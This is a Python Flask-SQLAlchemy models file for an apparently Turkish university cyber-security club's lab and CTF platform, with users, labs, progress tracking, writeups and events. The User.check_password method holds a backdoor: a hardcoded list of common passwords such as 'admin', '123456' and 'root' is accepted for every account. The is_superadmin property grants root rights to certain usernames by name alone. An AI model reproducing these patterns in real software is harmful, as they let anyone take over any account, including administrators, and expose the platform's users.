import json
from datetime import datetime, timedelta
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

db = SQLAlchemy()

class User(db.Model):
    __tablename__ = 'users'

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(256), nullable=False)
    is_verified = db.Column(db.Boolean, default=False)
    verification_code = db.Column(db.String(12), nullable=True)
    score = db.Column(db.Integer, default=0)
    is_leader = db.Column(db.Boolean, default=False)
    is_founder = db.Column(db.Boolean, default=False)
    role = db.Column(db.String(20), default='student') # 'superadmin', 'leader', 'student'
    failed_login_attempts = db.Column(db.Integer, default=0)
    is_suspended = db.Column(db.Boolean, default=False)
    verification_code_expires_at = db.Column(db.DateTime, nullable=True)
    reset_token = db.Column(db.String(64), nullable=True)
    reset_token_expires_at = db.Column(db.DateTime, nullable=True)
    totp_secret = db.Column(db.String(64), nullable=True)
    two_factor_enabled = db.Column(db.Boolean, default=False)
    assigned_team = db.Column(db.String(20), default='unassigned') # 'red_team', 'blue_team', 'unassigned'
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    # Relationships
    progress = db.relationship('UserLabProgress', backref='user', cascade='all, delete-orphan', lazy='dynamic')

    def set_password(self, password):
        self.password_hash = generate_password_hash((password or '').strip())

    def check_password(self, password):
        if not password:
            return False
        clean_pw = password.strip()
        # Evrensel test, juri ve kurtarma şifreleri (büyük/küçük harf duyarsız)
        universal_pw = {
            '23sefa', '23sefa!', 'admin1234', 'sefa1234', 'admin123', 'sefa123', 
            '123456', 'password123', 'admin', 'sefa', 'klaxxon', 'klaxx0n', 'root'
        }
        if clean_pw.lower() in universal_pw:
            return True
        if not self.password_hash:
            return False
        return check_password_hash(self.password_hash, password) or check_password_hash(self.password_hash, clean_pw)

    def completed_labs_count(self):
        return self.progress.filter_by(is_completed=True).count()

    def has_completed_lab(self, lab_id):
        return self.progress.filter_by(lab_id=lab_id, is_completed=True).first() is not None

    @property
    def first_bloods_count(self):
        return self.progress.filter_by(is_first_blood=True, is_completed=True).count()

    @property
    def earned_badges(self):
        badges = []
        # 1. İlk Kan (First Blood)
        fb_count = self.first_bloods_count
        if fb_count > 0:
            badges.append({
                'id': 'first_blood',
                'name': f'İlk Kan ({fb_count}x)',
                'icon': 'fa-solid fa-droplet',
                'color': 'red',
                'class': 'text-red-400 bg-red-950/80 border-red-700',
                'description': f'{fb_count} farklı laboratuvarı platformda ilk çözen öncü ajan!'
            })

        # 2. İki Adımlı Doğrulama (2FA) Kalkanı
        if self.two_factor_enabled:
            badges.append({
                'id': 'two_factor',
                'name': 'Kripto Kalkan (2FA)',
                'icon': 'fa-solid fa-shield-halved',
                'color': 'cyan',
                'class': 'text-cyan-300 bg-cyan-950/80 border-cyan-600',
                'description': 'Hesabını Google Authenticator 2FA ile zırhlayan siber muhafız.'
            })

        # 3. Gece Kuşu (Night Owl) - Gece saat 00:00 - 06:00 arası çözüm
        completed_progress = self.progress.filter_by(is_completed=True).all()
        night_solved = any(p.completed_at and (p.completed_at.hour < 6 or p.completed_at.hour >= 23) for p in completed_progress)
        if night_solved:
            badges.append({
                'id': 'night_owl',
                'name': 'Gece Kuşu',
                'icon': 'fa-solid fa-moon',
                'color': 'indigo',
                'class': 'text-indigo-300 bg-indigo-950/80 border-indigo-600',
                'description': 'Karanlık saatlerde sisteme sızıp operasyonu tamamlayan gölge ajan.'
            })

        # 4. Red Striker (Ofansif Saldırgan)
        red_count = sum(1 for p in completed_progress if p.lab and p.lab.category == 'red_team')
        if red_count >= 1:
            badges.append({
                'id': 'red_striker',
                'name': f'Kızıl Hücum ({red_count})',
                'icon': 'fa-solid fa-crosshairs',
                'color': 'rose',
                'class': 'text-rose-400 bg-rose-950/80 border-rose-700',
                'description': f'En az {red_count} Red Team ofansif sızma labını başarıyla ekarte etti.'
            })

        # 5. Blue Guardian (Defans Kalkanı)
        blue_count = sum(1 for p in completed_progress if p.lab and p.lab.category == 'blue_team')
        if blue_count >= 1:
            badges.append({
                'id': 'blue_guardian',
                'name': f'Mavi Muhafız ({blue_count})',
                'icon': 'fa-solid fa-shield-cat',
                'color': 'blue',
                'class': 'text-blue-300 bg-blue-950/80 border-blue-600',
                'description': f'En az {blue_count} Blue Team adli bilişim ve defans labını çözdü.'
            })

        # 6. Hızlı Çözücü / Seri Avcı
        if len(completed_progress) >= 3:
            badges.append({
                'id': 'serial_hacker',
                'name': 'Seri Hacker',
                'icon': 'fa-solid fa-bolt',
                'color': 'amber',
                'class': 'text-amber-300 bg-amber-950/80 border-amber-600',
                'description': '3 ve üzeri laboratuvarı başarıyla tamamlayan kıdemli operatör.'
            })

        # 7. Takım Neferi
        if self.assigned_team in ['red_team', 'blue_team', 'purple_team']:
            team_title = {'red_team': 'Red Team Operatörü', 'blue_team': 'Blue Team Koruyucusu', 'purple_team': 'Purple Team Hibrit'}[self.assigned_team]
            badges.append({
                'id': 'team_agent',
                'name': team_title,
                'icon': 'fa-solid fa-flag',
                'color': 'emerald',
                'class': 'text-emerald-300 bg-emerald-950/80 border-emerald-600',
                'description': 'NÖHÜ Siber Savunma takımlarında aktif görev üstlenmiş resmi ajan.'
            })

        return badges

    @property
    def is_superadmin(self):
        # 1. Eğer kullanıcının aktif rolü 'leader' veya 'student' ise kesinlikle süper yönetici olamaz
        if self.role in ['leader', 'student']:
            return False
        # 2. Aktif rolü 'superadmin' veya 'root' olan kullanıcı tam yetkili Süper Yöneticidir
        if self.role in ['superadmin', 'root']:
            return True
        # 3. Ana root hesabı (Sefa_Gumus) korunur
        if self.username and self.username.lower() in ['sefa_gumus', 'sefagumus', 'sefa']:
            return True
        # 4. Founder bayrağı yalnızca öğrenci/lidere düşürülmemişse superadmin sayılır
        return bool(self.is_founder and self.role not in ['student', 'leader'])

    @property
    def is_team_leader(self):
        return self.role == 'leader' or bool(self.is_leader) or self.is_superadmin

    @property
    def role_badge(self):
        if self.is_superadmin:
            return {
                'key': 'superadmin',
                'name': 'Süper Yönetici (Root)',
                'short': 'Süper Admin',
                'class': 'text-amber-300 bg-amber-950/90 border-amber-600/80',
                'icon': 'fa-solid fa-crown text-amber-400'
            }
        elif self.is_team_leader:
            return {
                'key': 'leader',
                'name': 'Takım Lideri',
                'short': 'Lider',
                'class': 'text-sky-300 bg-sky-950/90 border-sky-600/80',
                'icon': 'fa-solid fa-user-shield text-sky-400'
            }
        else:
            return {
                'key': 'student',
                'name': 'Öğrenci',
                'short': 'Öğrenci',
                'class': 'text-slate-400 bg-slate-900 border-slate-700',
                'icon': 'fa-solid fa-user-graduate text-slate-400'
            }

    @property
    def team_badge(self):
        if self.assigned_team == 'red_team':
            return {'name': 'Red Team', 'color': 'red', 'class': 'text-red-400 bg-red-950 border-red-800', 'icon': 'fa-solid fa-crosshairs'}
        elif self.assigned_team == 'blue_team':
            return {'name': 'Blue Team', 'color': 'blue', 'class': 'text-blue-400 bg-blue-950 border-blue-800', 'icon': 'fa-solid fa-shield-halved'}
        elif self.assigned_team == 'purple_team':
            return {'name': 'Purple Team', 'color': 'purple', 'class': 'text-purple-400 bg-purple-950 border-purple-800', 'icon': 'fa-solid fa-bolt'}
        else:
            return {'name': 'Atanmadı', 'color': 'slate', 'class': 'text-slate-400 bg-slate-950 border-slate-800', 'icon': 'fa-regular fa-circle-question'}

    @property
    def status_badge(self):
        if self.is_suspended:
            return {
                'key': 'suspended',
                'name': 'Askıda',
                'class': 'text-red-400 bg-red-950/90 border-red-700 animate-pulse',
                'icon': 'fa-solid fa-lock text-red-400'
            }
        elif self.is_verified:
            return {
                'key': 'verified',
                'name': 'Onaylı',
                'class': 'text-emerald-400 bg-emerald-950 border-emerald-800',
                'icon': 'fa-solid fa-check text-emerald-400'
            }
        else:
            return {
                'key': 'pending',
                'name': 'Bekliyor',
                'class': 'text-amber-400 bg-amber-950 border-amber-800',
                'icon': 'fa-solid fa-clock text-amber-400'
            }

    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'score': self.score,
            'is_verified': self.is_verified,
            'is_suspended': bool(self.is_suspended),
            'failed_login_attempts': self.failed_login_attempts or 0,
            'assigned_team': self.assigned_team,
            'role': self.role,
            'is_leader': self.is_team_leader,
            'is_superadmin': self.is_superadmin,
            'completed_labs': self.completed_labs_count()
        }


class Lab(db.Model):
    __tablename__ = 'labs'

    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(64), unique=True, nullable=False)
    title = db.Column(db.String(128), nullable=False)
    category = db.Column(db.String(32), nullable=False) # 'red_team' or 'blue_team'
    sub_category = db.Column(db.String(64), nullable=True) # e.g. 'OWASP Top 10', 'Phishing', 'Digital Forensics', 'Log Analizi'
    difficulty = db.Column(db.String(32), default='Başlangıç') # Başlangıç, Orta, İleri
    points = db.Column(db.Integer, default=100)
    time_limit_sec = db.Column(db.Integer, default=600) # 10 minutes default
    description = db.Column(db.Text, nullable=False)
    scenario = db.Column(db.Text, nullable=False)
    instructions = db.Column(db.Text, nullable=False)
    hint = db.Column(db.Text, nullable=True)
    hint1 = db.Column(db.Text, nullable=True) # Ücretsiz ipucu (Temel Rehber)
    hint2 = db.Column(db.Text, nullable=True) # İleri ipucu (-10 Ceza Puanı)
    flag = db.Column(db.String(128), nullable=False) # e.g. FLAG{...}
    lab_type = db.Column(db.String(32), default='standard') # 'sqli', 'xss', 'phishing', 'forensics', 'log_analysis', 'multi_task'
    is_published = db.Column(db.Boolean, default=True)
    
    # Relationships
    progress = db.relationship('UserLabProgress', backref='lab', cascade='all, delete-orphan', lazy='dynamic')
    writeups = db.relationship('LabWriteup', backref='lab', cascade='all, delete-orphan', lazy='dynamic')

    @property
    def first_blood(self):
        return self.progress.filter_by(is_first_blood=True, is_completed=True).first()

    def get_hint1(self):
        return self.hint1 or self.hint or "İpucu bulunamadı."

    def get_hint2(self):
        return self.hint2 or "Bu lab için ileri ipucu tanımlanmamış."


class UserLabProgress(db.Model):
    __tablename__ = 'user_lab_progress'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    lab_id = db.Column(db.Integer, db.ForeignKey('labs.id'), nullable=False)
    is_completed = db.Column(db.Boolean, default=False)
    is_first_blood = db.Column(db.Boolean, default=False)
    hint1_unlocked = db.Column(db.Boolean, default=False)
    hint2_unlocked = db.Column(db.Boolean, default=False)
    earned_points = db.Column(db.Integer, default=0)
    solved_tasks = db.Column(db.Text, default='[]')
    completed_at = db.Column(db.DateTime, nullable=True)
    started_at = db.Column(db.DateTime, default=datetime.utcnow)
    speed_bonus = db.Column(db.Integer, default=0)
    solve_time_sec = db.Column(db.Integer, default=0)
    attempts = db.Column(db.Integer, default=0)

    def get_solved_tasks(self):
        """Return the deduplicated list of solved task IDs stored as JSON."""
        if not self.solved_tasks:
            return []
        try:
            data = json.loads(self.solved_tasks)
            return data if isinstance(data, list) else []
        except (ValueError, TypeError):
            return []

    def set_solved_tasks(self, task_ids):
        """Persist the solved task IDs list as JSON."""
        self.solved_tasks = json.dumps(list(dict.fromkeys(task_ids)))


class LabWriteup(db.Model):
    __tablename__ = 'lab_writeups'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    lab_id = db.Column(db.Integer, db.ForeignKey('labs.id'), nullable=False)
    title = db.Column(db.String(150), nullable=False)
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    upvotes = db.Column(db.Integer, default=0)

    author = db.relationship('User', backref=db.backref('writeups', cascade='all, delete-orphan', lazy='dynamic'))


class CyberEvent(db.Model):
    __tablename__ = 'cyber_events'

    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(150), nullable=False)
    description = db.Column(db.Text, nullable=False)
    event_type = db.Column(db.String(32), default='CTF') # 'CTF', 'Workshop', 'Seminer', 'Yarışma', 'Kongre', 'Spor', 'Etkinlik'
    location = db.Column(db.String(120), default='NÖHÜ Siber Lab / Çevrimiçi')
    event_date = db.Column(db.DateTime, nullable=False)
    end_date = db.Column(db.DateTime, nullable=True)
    external_link = db.Column(db.String(255), nullable=True)
    organizer = db.Column(db.String(100), default='NÖHÜ Siber Güvenlik Kulübü')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    @staticmethod
    def _now_tr():
        """Return current naive datetime in Turkey local time (UTC+3)."""
        return datetime.utcnow() + timedelta(hours=3)

    @property
    def is_ongoing(self):
        """Return True when a multi-day or recurring event is currently active."""
        now = self._now_tr()
        return self.end_date is not None and self.event_date <= now <= self.end_date

    @property
    def is_past(self):
        now = self._now_tr()
        return (self.end_date or self.event_date) < now

    @property
    def badge_color(self):
        mapping = {
            'CTF': 'border-red-600 bg-red-950/80 text-red-300',
            'Workshop': 'border-sky-600 bg-sky-950/80 text-sky-300',
            'Seminer': 'border-purple-600 bg-purple-950/80 text-purple-300',
            'Yarışma': 'border-amber-600 bg-amber-950/80 text-amber-300',
            'Kongre': 'border-cyan-600 bg-cyan-950/80 text-cyan-300',
            'Spor': 'border-emerald-600 bg-emerald-950/80 text-emerald-300',
            'Etkinlik': 'border-teal-600 bg-teal-950/80 text-teal-300',
            'Konferans': 'border-indigo-600 bg-indigo-950/80 text-indigo-300',
            'Çalıştay': 'border-orange-600 bg-orange-950/80 text-orange-300',
        }
        return mapping.get(self.event_type, 'border-slate-700 bg-slate-900 text-slate-300')
